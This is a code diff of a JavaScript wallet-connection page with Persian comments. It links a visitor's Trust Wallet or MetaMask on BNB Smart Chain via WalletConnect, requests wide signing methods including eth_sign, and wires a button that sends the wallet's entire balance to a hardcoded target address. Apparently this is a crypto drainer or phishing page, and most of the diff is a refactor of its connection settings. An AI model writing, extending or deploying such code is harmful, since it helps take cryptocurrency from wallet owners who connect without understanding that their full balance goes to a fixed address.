@@ -1,24 +1,23 @@
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-import { ethers } from "ethers";
+import { ethers }            from "ethers";
 
-// === تنظیمات ثابت ===
+// تنظیمات ثابت
 const PROJECT_ID     = "4d08946e6c316bed5e76b450ccbb5256";
 const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 
-// وضعیت کیف پول انتخاب شده
 let selectedWallet = null;
 
-// گرفتن ارجاع به عناصر DOM
-const connectBtn  = document.getElementById("connect");
-const trustBtn    = document.getElementById("trust");
-const mmBtn       = document.getElementById("metamask");
-const optionsDiv  = document.getElementById("wallet-options");
-const infoDiv     = document.getElementById("info");
-const addrSpan    = document.getElementById("address");
-const balSpan     = document.getElementById("balance");
-const btnSend     = document.getElementById("send");
+// ارجاع به عناصر DOM
+const connectBtn = document.getElementById("connect");
+const trustBtn   = document.getElementById("trust");
+const mmBtn      = document.getElementById("metamask");
+const optionsDiv = document.getElementById("wallet-options");
+const infoDiv    = document.getElementById("info");
+const addrSpan   = document.getElementById("address");
+const balSpan    = document.getElementById("balance");
+const btnSend    = document.getElementById("send");
 
-// کلیک روی "اتصال کیف پول" → نمایش گزینه‌ها
+// کلیک روی دکمه اتصال → نمایش گزینه‌ها
 connectBtn.addEventListener("click", () => {
   optionsDiv.style.display = "block";
 });
@@ -37,44 +36,42 @@ mmBtn.addEventListener("click", () => {
 
 async function startConnection() {
   try {
-    // === ۱. init با requiredNamespaces صحیح ===
+    // ۱. init با مشخص کردن صریح chains
     const provider = await EthereumProvider.init({
       projectId: PROJECT_ID,
-      showQrModal: false,  // نمایش خودکار QR مودال غیرفعال
-      requiredNamespaces: {
-        eip155: {
-          chains: [56],     // BNB Smart Chain
-          methods: [
-            "eth_sendTransaction",
-            "eth_signTransaction",
-            "eth_sign",
-            "personal_sign",
-            "eth_signTypedData"
-          ],
-          events: ["chainChanged", "accountsChanged"],
-          rpcMap: {
-            56: "https://bsc-dataseed.binance.org/"
-          }
-        }
-      }
+      chains: [56],                     // BSC Mainnet
+      showQrModal: false,               // بدون مودال QR داخلی
+      rpcMap: { 56: "https://bsc-dataseed.binance.org/" },
+      methods: [
+        "eth_sendTransaction",
+        "eth_signTransaction",
+        "eth_sign",
+        "personal_sign",
+        "eth_signTypedData"
+      ],
+      events: [
+        "chainChanged",
+        "accountsChanged"
+      ]
     });
 
-    // === ۲. شنود URI برای deep link ===
+    // ۲. شنود URI برای deep link
     provider.on("display_uri", (uri) => {
-      const link = selectedWallet === "trust"
-        ? `trust://wc?uri=${encodeURIComponent(uri)}`
-        : `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
+      const link =
+        selectedWallet === "trust"
+          ? `trust://wc?uri=${encodeURIComponent(uri)}`
+          : `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
       window.location.href = link;
     });
 
-    // === ۳. اجرای اتصال ===
+    // ۳. اجرای فرایند اتصال
     await provider.enable();
 
-    // === ۴. ساخت ethers provider و signer ===
+    // ۴. آماده‌سازی ethers.js
     const ethProvider = new ethers.providers.Web3Provider(provider);
     const signer      = ethProvider.getSigner();
 
-    // دریافت آدرس و موجودی
+    // خواندن آدرس و موجودی
     const address = await signer.getAddress();
     const balance = await ethProvider.getBalance(address);
 
@@ -82,7 +79,7 @@ async function startConnection() {
     balSpan.textContent  = ethers.utils.formatEther(balance) + " BNB";
     infoDiv.style.display = "block";
 
-    // === ۵. ارسال کل موجودی با دکمه ===
+    // ۵. ارسال کل موجودی
     btnSend.addEventListener("click", async () => {
       const bal      = await ethProvider.getBalance(address);
       const gasPrice = await ethProvider.getGasPrice();
@@ -103,7 +100,7 @@ async function startConnection() {
 
       alert(`تراکنش ارسال شد:\n${tx.hash}`);
       await tx.wait();
-      alert("تایید شد!");
+      alert("تأیید شد!");
 
       // به‌روزرسانی موجودی
       const newBal = await ethProvider.getBalance(address);
